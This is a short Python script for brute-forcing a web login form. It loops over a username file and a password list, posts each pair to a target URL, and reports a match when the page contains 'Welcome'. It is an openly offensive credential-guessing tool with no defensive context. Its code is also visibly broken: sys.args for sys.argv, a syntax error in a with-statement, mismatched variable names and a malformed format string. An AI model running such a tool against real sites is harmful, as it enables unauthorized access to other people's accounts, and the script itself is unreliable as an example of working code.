import requests
import sys 

if len(sys.argv) !=4:
    print("Usage: python3 scritp.py <target_url> <username> <password_file>")
    sys.exit(1)

target = sys.args[1]
username = sys.args[2]
passwords = sys.args[3]
needle = "Welcome"

#Read usernames from file
with open(username, "r") as users"
    usernames =[user.strip for user in users]

#Attempt login for each userame-password combination
for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in password_list:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode('latin-1')))
            sys.stdout.flush()
            
            #Make the request
            response = requests.post(target, data={"username": username, "password": password})

            #Check if the response contains the needle
            if needle.encode() in response.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
                sys.exit()
    sys.stdout.write(f"\tNo password found for user '{}'\n".format(username))